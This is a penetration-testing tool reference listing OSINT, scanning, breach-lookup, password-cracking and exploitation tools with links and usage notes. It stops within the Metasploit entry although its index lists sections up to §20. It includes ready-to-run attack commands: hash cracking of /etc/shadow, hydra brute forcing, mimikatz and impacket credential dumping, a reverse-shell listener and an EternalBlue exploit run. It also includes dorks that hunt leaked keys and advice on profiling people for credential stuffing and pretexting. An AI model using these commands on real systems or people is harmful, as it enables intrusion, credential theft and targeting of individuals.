# 🔐 The Complete Cybersecurity Arsenal
### Every Tool You Will Ever Need — From Recon to Post-Exploitation

> **Reference Format:** Tool name → Type → Link → What it does → When you use it
> Each tool is separated by a divider line for clarity.
> This document covers: OSINT · Recon · Scanning · Exploitation · Post-Exploitation · Password Attacks · Web App Testing · Wireless · Forensics · Anonymity · Social Engineering · Threat Intelligence · Reporting

---

## 📌 INDEX BY SITUATION

| Situation | Go To Section |
|-----------|--------------|
| I need to recon a person or company | §1 OSINT & Passive Recon |
| I need to scan ports and services | §2 Network Scanning |
| I need to find breach data / leaked credentials | §3 Breach Intelligence |
| I need to crack a password or hash | §4 Password Attacks |
| I need to exploit a system | §5 Exploitation Frameworks |
| I need web app testing | §6 Web Application Testing |
| I need wireless attacks | §7 Wireless |
| I need post-exploitation / lateral movement | §8 Post-Exploitation |
| I need to analyze traffic / packets | §9 Traffic Analysis |
| I need to stay anonymous | §10 Anonymity & OpSec |
| I need threat intelligence | §11 Threat Intelligence |
| I need social engineering tools | §12 Social Engineering Tools |
| I need forensics / incident response | §13 Forensics & DFIR |
| I need to practice / learn hands-on | §14 Practice Platforms |
| I need vulnerability research / CVE data | §15 Vulnerability Databases |
| I need reporting tools | §16 Documentation & Reporting |
| I need cloud security tools | §17 Cloud Security |
| I need reverse engineering tools | §18 Reverse Engineering |
| I need mobile security tools | §19 Mobile Security |
| I need C2 / red team infrastructure | §20 C2 Frameworks & Red Team Infra |

---

## §1 — OSINT & PASSIVE RECONNAISSANCE

*You know a name, domain, email, IP, or username. You want to learn everything about it without touching their systems.*

---

### 🔍 Maltego
**Type:** Desktop application (Windows/Linux/macOS)
**Link:** [https://www.maltego.com](https://www.maltego.com)

The most powerful visual OSINT platform in existence. Maltego maps relationships between entities — a person's email connects to their LinkedIn, which connects to their employer's domain, which connects to IP ranges, which connects to exposed services. You see the full picture as an interactive graph, not a list. Every node you click expands into more intelligence. Used by intelligence agencies, financial crime investigators, and senior penetration testers.

**When:** You have a starting point (name, domain, email) and you want to map the entire network of relationships around it visually before any active engagement begins.

---

### 🔍 Recon-ng
**Type:** Command-line framework (Python) — Application
**Link:** [https://github.com/lanmaster53/recon-ng](https://github.com/lanmaster53/recon-ng)

Recon-ng is a modular web reconnaissance framework built to work exactly like Metasploit — but for OSINT instead of exploitation. Every module queries a different data source: one module scrapes LinkedIn for employees, another queries breach databases, another finds subdomains via certificate transparency logs, another maps IP ranges. All results feed into a local SQLite database that persists across sessions. You can generate full HTML reports from the collected intelligence at the end.

It has modules for: subdomain discovery, email harvesting from multiple sources, employee name discovery via LinkedIn and PGP databases, breach credential lookup, IP geolocation, reverse IP lookups, Shodan integration, BuiltWith technology detection, and dozens more.

**When:** You need structured, database-backed multi-source OSINT on a target organization. You want reusable workspace data, not one-off searches. Professional standard for external recon phases.

```
recon-ng
workspaces create target_engagement
modules load recon/domains-hosts/certificate_transparency
options set SOURCE targetco.com
run
modules load recon/domains-contacts/hunter_io
run
```

---

### 🔍 SpiderFoot
**Type:** Application (Python, web interface) — also SpiderFoot HX cloud version
**Link:** [https://www.spiderfoot.net](https://www.spiderfoot.net)
**GitHub:** [https://github.com/smicallef/spiderfoot](https://github.com/smicallef/spiderfoot)

SpiderFoot automates OSINT across 200+ data sources with a single seed input (IP, domain, email, name, ASN). It fires every relevant module simultaneously and builds a correlation graph automatically. Finds subdomains, emails, breach data, open ports (via Shodan), SSL certificates, social media accounts, dark web mentions, paste site exposure, and more. Returns everything in a visual interface with entity relationship mapping.

**When:** You want a fast, fully automated first sweep of a target. Run it overnight against a domain or company name and come back to a comprehensive intelligence picture in the morning.

---

### 🔍 theHarvester
**Type:** Command-line tool (included in Kali Linux)
**Link:** [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)

Specifically designed to harvest email addresses, employee names, subdomains, IP addresses, and virtual hosts from public sources. Sources include Google, Bing, LinkedIn, Shodan, Hunter.io, DNSdumpster, and many others. Fast and easy first step on any external assessment.

**When:** You need a quick sweep of emails and subdomains for a target domain before deeper OSINT work begins.

---

### 🔍 OSINT Framework
**Type:** Website (interactive reference map)
**Link:** [https://osintframework.com](https://osintframework.com)

Not a tool — a map. An interactive, hierarchically organized directory of hundreds of OSINT tools and sources, organized by what data you start with (email address, username, real name, IP, domain) and what you want to find. If you have an email and need to know what platforms it's registered on, OSINT Framework shows you every tool that can answer that question.

**When:** You are stuck. You have a piece of data and you do not know which tool to use next. Open this, navigate to your data type, and find the right tool.

---

### 🔍 OSINT Combine
**Type:** Website (tool collection)
**Link:** [https://www.osintcombine.com](https://www.osintcombine.com)

A curated set of OSINT tools optimized for efficiency — social media analysis, reverse image search, geolocation, domain investigation, bulk processing. Professional-grade, designed by Australian OSINT specialists. Best for social media username cross-platform search and geolocation analysis from image metadata.

**When:** You need to verify a person's identity across platforms, find their location from an image they posted, or process multiple OSINT targets at once.

---

### 🔍 SMART (Start.me Aggregated Resource Tool)
**Type:** Website
**Link:** [https://smart.myosint.training](https://smart.myosint.training)

Searches thousands of curated OSINT bookmark collections from practitioners worldwide through a single interface. Particularly useful for finding country-specific databases, specialized registries, and niche sources that general OSINT tools do not cover.

**When:** You need OSINT resources for a specific country (corporate registries, electoral rolls, court records) or a niche topic that general tools cannot cover.

---

### 🔍 Shodan
**Type:** Website + CLI tool + API
**Link:** [https://www.shodan.io](https://www.shodan.io)
**CLI:** `pip install shodan`

Shodan continuously scans the entire IPv4 internet and indexes what every port on every IP address returns — service banners, software versions, SSL certificate details, device types. Search by organization name, IP range, technology, geographic location, or specific CVE. Reveals every internet-facing service an organization runs, the exact software versions, and known vulnerabilities — all passively, without touching the target.

**When:** You want to see what services a target organization exposes to the internet without sending a single packet to them. Also: finding exposed IoT devices, industrial control systems, databases without authentication, and default-credential devices.

---

### 🔍 Censys
**Type:** Website + API
**Link:** [https://search.censys.io](https://search.censys.io)

Similar to Shodan but with exceptional certificate search capabilities. Censys maintains a separate, searchable index of all SSL/TLS certificates ever issued to publicly trusted CAs. Search by organization name, domain, or email address to find every certificate ever issued — revealing historical subdomains, internal project names, and infrastructure evolution.

**When:** Subdomain discovery via certificate history, finding services behind Cloudflare by looking at certificate subject alternative names, discovering infrastructure not visible in DNS.

---

### 🔍 SecurityTrails
**Type:** Website + API
**Link:** [https://securitytrails.com](https://securitytrails.com)

Historical DNS records for any domain — every A record, MX record, NS record, and TXT record a domain has ever had. Also shows all subdomains, reverse IP lookups, WHOIS history, and associated domains. The historical DNS data reveals IP addresses that were used before CDN migration (bypassing Cloudflare protection).

**When:** A target moved to Cloudflare and you can no longer see their real IP. SecurityTrails shows what IP they used before migration. Also for subdomain discovery and WHOIS intelligence.

---

### 🔍 crt.sh
**Type:** Website
**Link:** [https://crt.sh](https://crt.sh)

Public Certificate Transparency log search. Every SSL/TLS certificate ever issued by a trusted CA is logged in public CT logs. crt.sh provides a searchable interface over these logs. Searching `%.targetco.com` reveals every subdomain that has ever had a certificate issued for it — including development environments, internal tools that got public certs, and legacy infrastructure.

**When:** Subdomain enumeration via certificate transparency — one of the most reliable passive subdomain sources available. Completely passive.

---

### 🔍 DNSdumpster
**Type:** Website
**Link:** [https://dnsdumpster.com](https://dnsdumpster.com)

DNS reconnaissance and domain mapping tool. Provides all DNS record types (A, MX, NS, TXT, CNAME) plus a visual map of the discovered infrastructure. Identifies mail servers, name servers, and associated IP ranges. Free and entirely passive.

**When:** Quick visual DNS intelligence gathering at the start of a passive recon phase.

---

### 🔍 ViewDNS.info
**Type:** Website
**Link:** [https://viewdns.info](https://viewdns.info)

Comprehensive DNS tool collection: reverse IP lookup (all domains on a given IP), IP history (what IPs a domain has used over time), WHOIS lookup, reverse WHOIS (all domains registered by same email/registrant), DNS propagation checker, port scanner, domain age checker, and many more.

**When:** Finding all domains on a shared hosting IP (revealing related assets), tracking IP history, performing reverse WHOIS to find an organization's full domain portfolio.

---

### 🔍 Amass
**Type:** Command-line tool (included in Kali Linux)
**GitHub:** [https://github.com/owasp-amass/amass](https://github.com/owasp-amass/amass)

The most comprehensive subdomain enumeration tool. Combines passive (certificate transparency, DNS records, OSINT sources) and active (DNS brute force, permutation) techniques. Has a network mapping database that tracks infrastructure relationships over time. Used in scope expansion during external assessments.

**When:** You need the most thorough possible subdomain enumeration of a target domain. Will find subdomains that other tools miss.

---

### 🔍 Subfinder
**Type:** Command-line tool
**GitHub:** [https://github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)

Fast, passive-only subdomain enumeration. Queries certificate transparency logs, DNS datasets, and multiple OSINT APIs simultaneously. Faster than Amass for pure passive discovery.

**When:** Quick passive subdomain enumeration before active testing. Speed-optimized.

---

### 🔍 dnstwist
**Type:** Command-line tool
**GitHub:** [https://github.com/elceef/dnstwist](https://github.com/elceef/dnstwist)

Generates and checks all typosquatted variants of a domain — homoglyph attacks (replacing letters with similar-looking Unicode characters), character transpositions, addition/removal of characters, TLD variations. Shows which variants are registered and whether they have MX records (ready to send phishing emails).

**When:** Checking what phishing infrastructure exists impersonating your client. Also: registering defensive domains. Identifying active phishing campaigns.

---

### 🔍 Sherlock
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)

Searches for a username across 300+ social media platforms simultaneously. Returns all platforms where that username is registered.

**When:** You have a target's known username (from LinkedIn, Twitter, GitHub) and want to find all their other accounts across the internet.

---

### 🔍 Holehe
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/megadose/holehe](https://github.com/megadose/holehe)

Checks if an email address is registered on 100+ websites by using the "forgot password" API endpoints — without sending any email to the target address. Shows which services a given email is registered on.

**When:** You have a target's email address and want to know which services they use — useful for building a social engineering profile and for credential stuffing targeting.

---

### 🔍 WhatsMyName
**Type:** Website + GitHub tool
**Link:** [https://whatsmyname.app](https://whatsmyname.app)
**GitHub:** [https://github.com/WebBreacher/WhatsMyName](https://github.com/WebBreacher/WhatsMyName)

Username enumeration across hundreds of sites. Better maintained site-list than Sherlock for many platforms.

**When:** Username-based OSINT. Alternative or supplement to Sherlock.

---

### 🔍 LinkedIn (OSINT use)
**Type:** Website
**Link:** [https://www.linkedin.com](https://www.linkedin.com)

The richest source of employee intelligence available publicly. Job listings reveal technology stack. Employee profiles reveal specific tools, versions, and projects. Organizational structure reveals reporting hierarchies for authority-based pretexts.

**Tools to extract LinkedIn data:**
- **CrossLinked:** [https://github.com/m8sec/crosslinked](https://github.com/m8sec/crosslinked) — Scrapes LinkedIn employee names and generates email addresses in specified format
- **linkedin2username:** [https://github.com/initstring/linkedin2username](https://github.com/initstring/linkedin2username) — Generates username lists from LinkedIn company page

**When:** Target organization research for social engineering campaigns, technology stack identification, employee enumeration for credential attacks.

---

### 🔍 Hunter.io
**Type:** Website + API
**Link:** [https://hunter.io](https://hunter.io)

Finds email addresses associated with a domain and identifies the email format used (e.g., `{first}.{last}@domain.com`). Free tier allows 25 searches per month.

**When:** You know employee names from LinkedIn and need to construct their email addresses. Hunter.io reveals the format, you generate the rest.

---

### 🔍 OSINT Industries
**Type:** Website
**Link:** [https://osint.industries](https://osint.industries)

Advanced OSINT aggregation platform that searches phone numbers, email addresses, and usernames across hundreds of sources simultaneously, including social media, breach databases, and dark web sources.

**When:** Deep individual-level OSINT — you have a phone number or email and want everything associated with it.

---

### 🔍 Epieos
**Type:** Website
**Link:** [https://epieos.com](https://epieos.com)

Email address OSINT. Given an email, shows Google account data, Gravatar, calendar exposure, and registered services. Particularly powerful for Google account intelligence.

**When:** Email address investigation to identify associated accounts and services.

---

### 🔍 Intelx.io (Intelligence X)
**Type:** Website + API
**Link:** [https://intelx.io](https://intelx.io)

A search engine for leaked data, paste sites, dark web content, Tor, I2P, and public data breaches. Searches by email, domain, IP, Bitcoin address, and many other selectors. Has indexed billions of records including full breach databases.

**When:** Finding leaked credentials, sensitive documents, and dark web mentions of a target. One of the most comprehensive breach intelligence and dark web search platforms available.

---

### 🔍 Pipl
**Type:** Website (commercial)
**Link:** [https://pipl.com](https://pipl.com)

People search engine that aggregates records from social networks, public records, professional databases, and other sources. Builds comprehensive profiles including work history, family connections, addresses, and contact information.

**When:** Deep individual OSINT — building a full profile of a specific person for social engineering pretext construction.

---

### 🔍 Social-Searcher
**Type:** Website
**Link:** [https://www.social-searcher.com](https://www.social-searcher.com)

Real-time social media search across multiple platforms simultaneously. Find mentions of a target name, organization, or topic across Twitter/X, Facebook, Instagram, YouTube, Reddit, and more.

**When:** Monitoring what a target person or organization is publicly posting across social platforms in real time.

---

### 🔍 FOCA
**Type:** Windows application
**Link:** [https://github.com/ElevenPaths/FOCA](https://github.com/ElevenPaths/FOCA)

Fingerprints Organizations with Collected Archives. Searches Google and Bing for documents (PDF, DOCX, XLSX, PPTX) published on a target domain, downloads them, and extracts metadata — usernames, software versions, internal server paths, email addresses, GPS coordinates from images.

**When:** Document metadata intelligence gathering. Reveals internal usernames, software versions, and infrastructure paths from publicly available documents.

---

### 🔍 Metagoofil
**Type:** Command-line tool (included in Kali Linux)
**GitHub:** [https://github.com/opsdisk/metagoofil](https://github.com/opsdisk/metagoofil)

Like FOCA but command-line. Searches for and downloads documents from a target domain, then extracts metadata using exiftool.

**When:** Automated document metadata extraction on Linux systems.

---

### 🔍 ExifTool
**Type:** Command-line tool
**Link:** [https://exiftool.org](https://exiftool.org)

Reads and writes metadata in 200+ file formats. Extracts GPS coordinates, author names, software versions, creation dates, and internal paths from images and documents.

**When:** Analyzing files found during OSINT to extract hidden metadata — particularly GPS coordinates from photos that reveal physical locations.

---

### 🔍 Google Dorking / GHDB
**Type:** Technique + Database
**Google Hacking Database:** [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)

Advanced Google search operators that surface information organizations accidentally exposed publicly. The GHDB contains thousands of tested dorks organized by category: login portals, exposed files, database errors, network device interfaces, and more.

**Key operators:**
```
site:targetco.com filetype:xlsx "confidential"
inurl:admin site:targetco.com
intitle:"index of" site:targetco.com
site:targetco.com "password"
"targetco.com" "BEGIN RSA PRIVATE KEY" site:github.com
```

**When:** Finding exposed sensitive files, login portals, and configuration data on a target domain or in public repositories.

---

### 🔍 Wayback Machine (Internet Archive)
**Type:** Website
**Link:** [https://web.archive.org](https://web.archive.org)

Archives web pages going back to 1996. Reveals historical content — removed pages, old employee directories, archived documentation, legacy technology, old admin paths, and content that existed before a website redesign.

**Tool for automated URL extraction:**
- **waybackurls:** [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) — Pulls all URLs ever archived for a domain
- **gau (GetAllUrls):** [https://github.com/lc/gau](https://github.com/lc/gau) — Combines Wayback Machine, CommonCrawl, and VirusTotal URL data

**When:** Finding endpoints that no longer appear on the live site but may still function on the server. Finding admin paths, backup files, and legacy application entry points.

---

### 🔍 GitHub (OSINT / Secret Discovery)
**Type:** Website + Search
**Link:** [https://github.com](https://github.com)
**Search interface:** [https://github.com/search](https://github.com/search)

Search GitHub for accidentally committed credentials, API keys, internal URLs, and configuration files associated with a target organization.

**Key tools:**
- **truffleHog:** [https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) — Scans git history for secrets
- **Gitleaks:** [https://github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks) — Detects hardcoded secrets in git repos
- **Gitrob:** [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob) — Reconnaissance on GitHub organizations

**Search dorks:**
```
org:targetco "password"
org:targetco "api_key"
org:targetco "AKIA"           # AWS key prefix
"targetco.com" "secret"
```

**When:** Finding accidentally committed API keys, AWS credentials, database passwords, private SSH keys, and internal configuration files in public code repositories.

---

### 🔍 Builtwith
**Type:** Website + Browser extension
**Link:** [https://builtwith.com](https://builtwith.com)

Identifies the technology stack of any website — CMS, framework, analytics, advertising, CDN, hosting, email marketing, JavaScript libraries, and more.

**When:** Technology stack fingerprinting of a web target before testing. Reveals what specific products to attack.

---

### 🔍 Wappalyzer
**Type:** Browser extension + CLI + API
**Link:** [https://www.wappalyzer.com](https://www.wappalyzer.com)

Real-time technology fingerprinting as you browse. Identifies CMS, frameworks, web servers, and libraries on any page you visit.

**When:** Real-time technology identification while browsing a target web application.

---

### 🔍 Hacker.org
**Type:** Website (CTF-style challenge platform)
**Link:** [https://hacker.org](https://hacker.org)

A training and challenge platform built around progressively harder security puzzles — cryptography, programming, web security, network analysis, and steganography challenges. Not a tool for testing real targets — it is a skill development environment.

**When:** Developing the analytical skills needed for real-world OSINT and penetration testing through hands-on practice in a legal, controlled environment.

---

## §2 — NETWORK SCANNING & ENUMERATION

*You have IP addresses. You want to know what is running on them.*

---

### 🔍 Nmap
**Type:** Command-line tool + GUI (Zenmap) — included in Kali Linux
**Link:** [https://nmap.org](https://nmap.org)

The foundational network scanning tool. Discovers live hosts, identifies open ports, detects service versions, fingerprints operating systems, and runs NSE scripts for automated vulnerability detection. The most important single tool in network reconnaissance.

**When:** Any situation where you need to know what is running on a network. First active tool used after host discovery in every assessment.

---

### 🔍 Masscan
**Type:** Command-line tool
**GitHub:** [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)

Internet-scale port scanner. Can scan the entire IPv4 internet (4 billion IPs) in under 5 minutes at maximum speed. Not as detailed as Nmap but extraordinarily fast for initial host/port discovery on large ranges.

**When:** You have a large IP range to scan quickly. Run Masscan first for raw port discovery, then run Nmap only against discovered open ports for detailed enumeration.

```bash
masscan -p1-65535 10.0.0.0/8 --rate=100000
```

---

### 🔍 Rustscan
**Type:** Command-line tool
**GitHub:** [https://github.com/RustScan/RustScan](https://github.com/RustScan/RustScan)

Fast port scanner written in Rust. Scans all 65,535 ports in seconds then automatically passes results to Nmap for detailed enumeration. The best of both worlds — speed of Masscan, depth of Nmap.

**When:** Complete port scanning of a single host or small range where you want both speed and depth.

---

### 🔍 Netcat (nc)
**Type:** Command-line tool — included in Kali Linux

The "Swiss Army knife" of networking. Opens raw TCP/UDP connections, does banner grabbing, creates listeners, transfers files, and establishes reverse shells. No website — it is a standard Unix utility.

```bash
nc -v target 80          # Banner grab
nc -lvnp 4444            # Set up listener for reverse shell
nc target 443 < file.txt # File transfer
```

**When:** Quick manual banner grabbing, testing port connectivity, receiving reverse shell connections, transferring files.

---

### 🔍 enum4linux-ng
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/cddmp/enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

SMB enumeration tool. Extracts users, groups, shares, password policy, operating system info, and domain information from Windows targets using anonymous or authenticated SMB sessions.

**When:** You found port 139/445 (SMB) open on a Windows target and need to extract all available information — user lists, share access, password lockout policy.

---

### 🔍 snmpwalk / snmp-check
**Type:** Command-line tools — included in Kali Linux

Enumerate SNMP-enabled devices using a known community string. Returns complete device configuration: interfaces, routing table, ARP table, running processes, installed software.

**When:** You found UDP port 161 (SNMP) open. Test for default community strings ("public", "private") and if successful, dump the entire device configuration.

---

### 🔍 onesixtyone
**Type:** Command-line tool — included in Kali Linux
**GitHub:** [https://github.com/trailofbits/onesixtyone](https://github.com/trailofbits/onesixtyone)

Fast SNMP community string brute forcer. Tests hundreds of community strings against many hosts simultaneously.

**When:** You found SNMP open on multiple hosts and need to identify which community strings are in use.

---

### 🔍 ldapsearch
**Type:** Command-line tool — included in Kali Linux

Queries LDAP/Active Directory for users, computers, groups, and domain policies. Standard tool for AD enumeration.

**When:** You found port 389 (LDAP) open and want to extract organizational data from Active Directory — particularly useful with even limited credentials.

---

### 🔍 nikto
**Type:** Command-line tool — included in Kali Linux
**GitHub:** [https://github.com/sullo/nikto](https://github.com/sullo/nikto)

Web server scanner that checks for thousands of known dangerous files, outdated software versions, and server misconfigurations. Quick first-pass against any web server.

**When:** You discovered a web server and want a fast initial check for obvious misconfigurations, exposed admin interfaces, and default files.

---

## §3 — BREACH INTELLIGENCE & CREDENTIAL EXPOSURE

*You want to know if a person, organization, or domain has appeared in known data breaches.*

---

### 🔍 HaveIBeenPwned
**Type:** Website + API
**Link:** [https://haveibeenpwned.com](https://haveibeenpwned.com)

The most trusted and widely used breach notification service. Check if an email address appears in any of 600+ known data breaches. The domain search API allows checking all compromised email addresses for an entire domain — essential for enterprise security assessments.

**When:** Checking individual email exposure, bulk domain breach assessment, building a list of compromised employee accounts for credential stuffing attack planning.

---

### 🔍 Dehashed
**Type:** Website + API
**Link:** [https://dehashed.com](https://dehashed.com)

Comprehensive breach database with over 15 billion records. Searches by email, username, IP address, name, phone number, domain, or VIN. Returns plaintext or hashed passwords when available. One of the most complete breach intelligence platforms for security research.

**When:** Deep credential research. Finding historical passwords for a target user that reveal password patterns. Domain-wide breach analysis.

---

### 🔍 Breach Directory
**Type:** Website + API
**Link:** [https://breachdirectory.com](https://breachdirectory.com)

Search breach databases by email address. Shows partial SHA-1 hashes of exposed passwords — allows confirming a password exists in breach data without full exposure.

**When:** Verifying credential exposure with partial hash validation. Authorized security assessments where password confirmation without full disclosure is needed.

---

### 🔍 Intelligence X (Intelx.io)
**Type:** Website + API
**Link:** [https://intelx.io](https://intelx.io)

Already listed in OSINT section but critically important here: indexes full breach databases, dark web content, paste sites, and Tor. Searches by email, domain, IP, Bitcoin address. Has some of the deepest breach data available.

**When:** Finding breach records not available in mainstream databases, dark web credential exposure, paste site monitoring.

---

### 🔍 F-Secure Identity Checker
**Type:** Website
**Link:** [https://www.f-secure.com/en/home/free-tools/identity-checker](https://www.f-secure.com/en/home/free-tools/identity-checker)

F-Secure's breach checking service using their own threat intelligence database — captures some breaches not in HaveIBeenPwned.

**When:** Supplementary breach check when HIBP does not show exposure but you suspect there is data elsewhere.

---

### 🔍 HackNotice
**Type:** Website + service
**Link:** [https://hacknotice.com](https://hacknotice.com)

Breach monitoring and notification service with dark web monitoring capabilities. Provides organizational breach alerts and employee exposure tracking.

**When:** Continuous monitoring of an organization's breach exposure rather than point-in-time checks.

---

### 🔍 Keeper Security (BreachWatch)
**Type:** Commercial service / product
**Link:** [https://keepersecurity.com](https://keepersecurity.com)

Enterprise password manager with BreachWatch feature — continuously monitors employee credentials against dark web breach data and alerts when credentials appear in breach databases.

**When:** Understanding a target organization's security posture and breach monitoring program. Relevant for assessing whether clients have credential exposure monitoring in place.

---

### 🔍 WhatBreach
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/Ekultek/WhatBreach](https://github.com/Ekultek/WhatBreach)

Checks email addresses against multiple breach databases simultaneously — HIBP, Dehashed, and others. Command-line automation for bulk email breach checking.

**When:** Bulk checking of a list of employee email addresses discovered during OSINT against multiple breach databases simultaneously.

---

### 🔍 LeakLooker
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/woj-ciech/LeakLooker](https://github.com/woj-ciech/LeakLooker)

Searches Shodan and other sources for exposed databases — unprotected MongoDB, Elasticsearch, CouchDB, Redis, and other database instances. Also searches for exposed files on public platforms.

**When:** Finding exposed databases belonging to a target organization — databases with no authentication that are readable by anyone on the internet.

---

### 🔍 Buster
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/sham00n/buster](https://github.com/sham00n/buster)

Takes an email address and finds all associated accounts and profiles across the internet — Gravatar, GitHub, GitLab, Disqus, About.me, and others. Discovers the full account footprint associated with an email address.

**When:** You have an email address and want to discover every online account associated with it — for building a target profile or finding additional attack surfaces.

---

### 🔍 Scavenger
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/rndinfosecguy/Scavenger](https://github.com/rndinfosecguy/Scavenger)

OSINT aggregator focused on finding exposed credentials from dark web sources, paste sites, and IRC leak channels.

**When:** Hunting for credentials in non-mainstream breach sources — dark web paste sites, IRC dump channels, and underground forums.

---

### 🔍 PwnDB
**Type:** Command-line tool (Python) — requires Tor
**GitHub:** [https://github.com/davidtavarez/pwndb](https://github.com/davidtavarez/pwndb)

Command-line interface for querying the PwnDB dark web database, which contains a large collection of leaked credentials. Requires Tor to be running locally as PwnDB is accessible only as a Tor hidden service.

```bash
# Requires Tor: sudo service tor start
python3 pwndb.py --target email@domain.com
python3 pwndb.py --target domain.com    # All emails for a domain
```

**When:** Finding plaintext or recovered passwords from dark web breach databases — particularly when credentials are not in mainstream breach databases.

---

## §4 — PASSWORD ATTACKS & HASH CRACKING

*You have a hash, an encrypted file, or a login form. You need the plaintext credential.*

---

### 🔍 Hashcat
**Type:** Command-line application
**Link:** [https://hashcat.net](https://hashcat.net)

The world's fastest password recovery tool. Uses GPU acceleration for cracking password hashes. Supports 350+ hash types. Multiple attack modes: dictionary, combinator, mask (pattern-based), rule-based transformation, hybrid.

```bash
# Dictionary attack on NTLM hashes
hashcat -m 1000 hashes.txt rockyou.txt

# Dictionary + rules (most effective for real-world passwords)
hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule

# Mask attack (8-character passwords: uppercase + lowercase + number)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?l?d
```

**When:** You have extracted password hashes (from a database dump, SAM file, NTDS.dit, /etc/shadow, or captured NTLM hashes from a network) and need to recover plaintext passwords.

---

### 🔍 John the Ripper (JtR)
**Type:** Command-line tool — included in Kali Linux
**Link:** [https://www.openwall.com/john](https://www.openwall.com/john)

CPU-based password cracker with automatic hash type detection. Better than Hashcat for certain formats (Office documents, PDF passwords, SSH keys, 7-zip archives) and for machines without powerful GPUs.

```bash
# Crack Linux shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# Crack SSH private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
```

**When:** Cracking encrypted files, SSH keys, Office documents, and formats where Hashcat lacks modules. Also excellent on CPU-only systems.

---

### 🔍 Hydra
**Type:** Command-line tool — included in Kali Linux
**GitHub:** [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

Network login brute force tool. Supports 50+ protocols: HTTP, HTTPS, FTP, SSH, Telnet, SMB, RDP, MySQL, PostgreSQL, SMTP, POP3, IMAP, and many more. Parallelized for speed.

```bash
# SSH brute force
hydra -l admin -P rockyou.txt ssh://target

# HTTP POST login form
hydra -l admin -P rockyou.txt target http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Multiple usernames and passwords
hydra -L users.txt -P passwords.txt smb://target
```

**When:** You have identified a login interface and want to test for weak credentials using a username/password list. For authorized brute force testing of network services.

---

### 🔍 Medusa
**Type:** Command-line tool — included in Kali Linux

Network authentication brute forcer. Similar to Hydra but handles some protocols differently. Useful as an alternative when Hydra has issues with specific targets.

**When:** Alternative to Hydra for parallelized network authentication brute forcing.

---

### 🔍 Spray / TREVORspray / MSOLSpray
**Type:** Command-line tools

Password spraying tools designed specifically for Microsoft 365 and Azure AD. Test one password against many accounts to avoid lockouts.

- **TREVORspray:** [https://github.com/blacklanternsecurity/trevorspray](https://github.com/blacklanternsecurity/trevorspray)
- **MSOLSpray:** [https://github.com/dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)

**When:** You have a list of email addresses for a Microsoft 365 organization and want to test whether any use common passwords — without triggering account lockouts by spreading the attempt across many accounts.

---

### 🔍 CrackStation
**Type:** Website
**Link:** [https://crackstation.net](https://crackstation.net)

Free online hash lookup. Checks submitted hashes against a pre-computed rainbow table database of 15 billion entries covering MD5, SHA1, SHA256, and other common formats.

**When:** Quick online check for common hashes before investing time in local cracking. If the hash is in the rainbow table, it returns the plaintext in seconds.

---

### 🔍 Wordlists — SecLists
**Type:** GitHub repository
**GitHub:** [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

The definitive collection of security wordlists: password lists (rockyou.txt and many more), username lists, subdomain lists, directory brute force lists, fuzzing payloads, web shell lists, and more. Used as input for virtually every brute force and fuzzing tool.

**When:** You need a wordlist for any brute force or fuzzing operation. This is the first place to look.

---

### 🔍 Mimikatz
**Type:** Windows application / PowerShell module
**GitHub:** [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and other credentials from Windows memory (LSASS process), the SAM database, and Active Directory. The most important credential extraction tool for Windows environments.

```powershell
# In Meterpreter (post-exploitation)
load kiwi
creds_all           # Dump all credentials
lsa_dump_sam        # Dump local SAM hashes
lsa_dump_secrets    # Dump LSA secrets
```

**When:** You have administrative access to a Windows machine (or Meterpreter session with SYSTEM privileges) and need to extract credentials for lateral movement.

---

### 🔍 Impacket
**Type:** Python library + collection of tools
**GitHub:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

A collection of Python scripts for Windows networking and Active Directory attacks. Includes: secretsdump (remote SAM/NTDS dumping), psexec (remote command execution with credentials), smbclient, wmiexec, dcomexec, GetUserSPNs (Kerberoasting), GetNPUsers (ASREPRoasting), and more.

```bash
# Dump credentials from a remote Windows machine with admin creds
impacket-secretsdump DOMAIN/user:password@target

# Kerberoasting — request service tickets for cracking
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request

# Remote execution
impacket-psexec DOMAIN/admin:password@target
```

**When:** Any Windows/Active Directory attack — credential dumping, remote execution, Kerberos attacks, lateral movement. Essential for Windows pentesting.

---

## §5 — EXPLOITATION FRAMEWORKS

*You have identified a vulnerability. You need to exploit it.*

---

### 🔍 Metasploit Framework
**Type:** Command-line framework + web interface (Metasploit Community)
**Link:** [https://www.metasploit.com](https://www.metasploit.com)
**GitHub:** [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

The most important exploitation framework in existence. Contains 2,000+ exploit modules, 500+ auxiliary modules, and hundreds of post-exploitation modules. Manages the entire exploitation lifecycle: reconnaissance, exploitation, payload delivery, session management, and post-exploitation.

```bash
msfconsole
search CVE-2017-0144
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
run
```

